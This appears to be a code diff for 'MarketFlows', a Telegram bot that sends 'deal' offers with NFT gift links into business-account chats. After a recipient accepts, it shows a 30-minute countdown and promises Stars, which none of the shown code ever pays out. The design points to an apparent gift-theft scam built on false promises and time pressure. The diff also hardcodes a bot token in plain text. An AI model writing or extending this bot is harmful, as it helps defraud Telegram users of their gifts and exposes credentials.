@@ -3,29 +3,38 @@ import secrets
 import sqlite3  
 import re
 from datetime import datetime, timedelta  
-  
+from aiohttp import web
+
 from aiogram import Bot, Dispatcher, F, Router  
 from aiogram.client.default import DefaultBotProperties  
 from aiogram.enums import ParseMode  
 from aiogram.filters import CommandStart  
 from aiogram.fsm.storage.memory import MemoryStorage  
+from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
 from aiogram.types import (  
     Message, CallbackQuery, BusinessConnection,  
     InlineKeyboardMarkup, InlineKeyboardButton,  
     ReplyKeyboardMarkup, KeyboardButton  
 )  
-  
+
 BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
 BRAND = "MarketFlows"  
 DB_PATH = "marketflows.db"  
 
+# Если ты тестируешь на Bothost с поллингом, закомментируй вебхуки. 
+# Но для идеальной работы Telegram Business нужен вебхук на VPS.
+USE_WEBHOOK = False 
+WEBHOOK_HOST = "https://yourdomain.com"
+WEBHOOK_PATH = f"/webhook/{BOT_TOKEN}"
+WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
+
 active_business_connection_id = None
-last_business_chat_id = None
-last_business_chat_name = None
+active_business_chats = {} 
 
 def db_init():  
     conn = sqlite3.connect(DB_PATH)  
     c = conn.cursor()  
+    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')""")
     c.execute("""CREATE TABLE IF NOT EXISTS deals (  
         id INTEGER PRIMARY KEY AUTOINCREMENT,  
         code TEXT UNIQUE,  
@@ -70,12 +79,12 @@ async def business_connection_handler(bc: BusinessConnection):
 
 @router.message(F.business_connection_id.is_not(None))
 async def business_message_handler(msg: Message):
-    global active_business_connection_id, last_business_chat_id, last_business_chat_name
+    global active_business_connection_id
     if msg.business_connection_id:
         active_business_connection_id = msg.business_connection_id
     if msg.chat and msg.chat.id != msg.from_user.id:
-        last_business_chat_id = msg.chat.id
-        last_business_chat_name = f"@{msg.chat.username}" if msg.chat.username else (msg.chat.first_name or "Клиент")
+        name = f"@{msg.chat.username}" if msg.chat.username else (msg.chat.first_name or str(msg.chat.id))
+        active_business_chats[msg.chat.id] = name
 
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
@@ -86,7 +95,7 @@ async def cmd_start(msg: Message):
         if deal:  
             custom_text = deal[4]
             gift_link = deal[5]
-            text_msg = f"{custom_text}\n\n{gift_link}"
+            text_msg = f"{custom_text}\n\n{gift_link}" if custom_text else gift_link
             
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [
@@ -101,8 +110,11 @@ async def cmd_start(msg: Message):
 
 @router.message(F.text == "📂 Мои чаты")
 async def chats_list(msg: Message):
-    target = f"{last_business_chat_name} (ID: <code>{last_business_chat_id}</code>)" if last_business_chat_id else "Нет активных чатов"
-    await msg.answer(f"📋 <b>Последний бизнес-чат:</b> {target}", parse_mode="HTML", reply_markup=main_menu())
+    if active_business_chats:
+        text = "📋 <b>Активные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
+    else:
+        text = "ℹ️ Нет активных чатов. Напишите кому-нибудь с бизнес-аккаунта в Telegram."
+    await msg.answer(text, parse_mode="HTML", reply_markup=main_menu())
 
 @router.message(F.text == "🤝 Создать сделку")
 async def create_deal_btn(msg: Message):
@@ -114,6 +126,16 @@ async def handle_deal_creation_text(msg: Message):
         return
 
     full_text = msg.text.strip()
+    words = full_text.split()
+    gift_link = "https://t.me/nft/Gift"
+    for w in words:
+        if w.startswith("http://") or w.startswith("https://"):
+            gift_link = w
+            break
+
+    # Жестко вычищаем ссылку из кастомного текста, чтобы она не дублировалась
+    clean_text = full_text.replace(gift_link, "").strip()
+
     code = secrets.token_hex(4).upper()
     expires_at = datetime.utcnow() + timedelta(minutes=30)
     
@@ -121,23 +143,28 @@ async def handle_deal_creation_text(msg: Message):
     conn.execute(  
         "INSERT INTO deals (code, creator_id, creator_username, custom_text, gift_link, status, expires_at, created_at) "  
         "VALUES (?,?,?,?,?,?,?,?)",  
-        (code, msg.from_user.id, f"@{msg.from_user.username}" if msg.from_user.username else str(msg.from_user.id), full_text, "https://t.me/nft/Gift", 'pending', expires_at.isoformat(), datetime.utcnow().isoformat())  
+        (code, msg.from_user.id, f"@{msg.from_user.username}" if msg.from_user.username else str(msg.from_user.id), clean_text, gift_link, 'pending', expires_at.isoformat(), datetime.utcnow().isoformat())  
     )  
     conn.commit()  
     conn.close()
 
-    target_chat = last_business_chat_id if last_business_chat_id else msg.chat.id
-    btn_name = last_business_chat_name if last_business_chat_name else "Тест"
-
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"📤 Отправить: {btn_name}", callback_data=f"sendtochat_{code}_{target_chat}")],
+    buttons = [
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
             InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
         ]
-    ])
+    ]
+    
+    if active_business_chats:
+        for cid, name in active_business_chats.items():
+            buttons.insert(0, [InlineKeyboardButton(text=f"📤 Отправить: {name}", callback_data=f"sendtochat_{code}_{cid}")])
+    else:
+        buttons.insert(0, [InlineKeyboardButton(text="📤 Отправить ордер (Тест)", callback_data=f"sendtochat_{code}_{msg.chat.id}")])
 
-    await msg.answer(text=full_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
+    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+    preview_text = f"{clean_text}\n\n{gift_link}" if clean_text else gift_link
+
+    await msg.answer(text=preview_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
 
 @router.callback_query(F.data.startswith("sendtochat_"))
 async def send_to_chat(cb: CallbackQuery):
@@ -151,6 +178,9 @@ async def send_to_chat(cb: CallbackQuery):
         return
 
     custom_text = deal[4]
+    gift_link = deal[5]
+    text_msg = f"{custom_text}\n\n{gift_link}" if custom_text else gift_link
+
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
@@ -158,11 +188,14 @@ async def send_to_chat(cb: CallbackQuery):
         ]
     ])
 
+    target_name = active_business_chats.get(target_chat_id, "клиенту")
+
     try:
+        # Шлем четко через бизнес-соединение с правильным ID чата
         if active_business_connection_id:
             await cb.bot.send_message(
                 chat_id=target_chat_id,
-                text=custom_text,
+                text=text_msg,
                 parse_mode="HTML",
                 reply_markup=kb,
                 disable_web_page_preview=False,
@@ -171,16 +204,16 @@ async def send_to_chat(cb: CallbackQuery):
         else:
             await cb.bot.send_message(
                 chat_id=target_chat_id,
-                text=custom_text,
+                text=text_msg,
                 parse_mode="HTML",
                 reply_markup=kb,
                 disable_web_page_preview=False
             )
         
         await cb.message.edit_reply_markup(reply_markup=None)
-        await cb.answer("Ордер успешно отправлен!", show_alert=True)
+        await cb.answer(f"Отправлено: {target_name}. Telegram подтвердил.", show_alert=True)
     except Exception as e:
-        await cb.answer(f"Ошибка: {e}", show_alert=True)
+        await cb.answer(f"Ошибка отправки: {e}", show_alert=True)
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
@@ -195,16 +228,18 @@ async def sel_accept(cb: CallbackQuery):
     amount_str = numbers[0] if numbers else "3000"
 
     set_db_status(code, "accepted")
-    await cb.answer(f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ поступят на ваш аккаунт.", show_alert=True)
+    await cb.answer(f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ поступят на аккаунт.", show_alert=True)
 
     gift_link = deal[5]
     expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)
+    
     diff = expires_at - datetime.utcnow()
     total_secs = max(0, int(diff.total_seconds()))
     mins, secs = divmod(total_secs, 60)
     timer_str = f"{mins:02d}:{secs:02d}"
 
-    text_msg = f"{custom_text}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
+    text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>" if custom_text else f"{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
+
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
         [
@@ -226,8 +261,41 @@ async def sel_accept(cb: CallbackQuery):
             )
         else:
             await cb.message.edit_text(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
+        asyncio.create_task(run_animation_timer(cb.bot, cb.message.chat.id, cb.message.message_id, code, gift_link, custom_text, expires_at, active_business_connection_id))
     except Exception:
         pass
+
+async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str, gift_link: str, custom_text: str, expires_at: datetime, biz_id: str):
+    while True:
+        await asyncio.sleep(30)
+        deal = get_deal(code)
+        if not deal or deal[6] != 'accepted':
+            break
+
+        diff = expires_at - datetime.utcnow()
+        total_secs = int(diff.total_seconds())
+        if total_secs <= 0:
+            break
+
+        mins, secs = divmod(total_secs, 60)
+        timer_str = f"{mins:02d}:{secs:02d}"
+
+        text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>" if custom_text else f"{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
+            [
+                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
+                InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
+            ]
+        ])
+
+        try:
+            if biz_id:
+                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False, business_connection_id=biz_id)
+            else:
+                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
+        except Exception:
+            break
 
 @router.callback_query(F.data.startswith("sel_reject_"))
 async def sel_reject(cb: CallbackQuery):
@@ -245,14 +313,26 @@ async def sel_reject(cb: CallbackQuery):
 async def main():  
     db_init()  
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
-    
-    # Жестко сбрасываем вебхук перед запуском поллинга
-    await bot.delete_webhook(drop_pending_updates=True)  
-    
     dp = Dispatcher(storage=MemoryStorage())  
     dp.include_router(router)  
-    print(f"[{BRAND}] Бот успешно запущен.")  
-    await dp.start_polling(bot)  
+    
+    if USE_WEBHOOK:
+        await bot.set_webhook(WEBHOOK_URL, drop_pending_updates=True)
+        app = web.Application()
+        webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
+        webhook_requests_handler.register(app, path=WEBHOOK_PATH)
+        setup_application(app, dp, bot=bot)
+        
+        runner = web.AppRunner(app)
+        await runner.setup()
+        site = web.TCPSite(runner, "0.0.0.0", 8080)
+        await site.start()
+        print(f"[{BRAND}] Веб-сервер запущен на порту 8080.")
+        await asyncio.Event().wait()
+    else:
+        await bot.delete_webhook(drop_pending_updates=True)  
+        print(f"[{BRAND}] Бот запущен в режиме поллинга.")  
+        await dp.start_polling(bot)  
 
 if __name__ == "__main__":  
     asyncio.run(main())
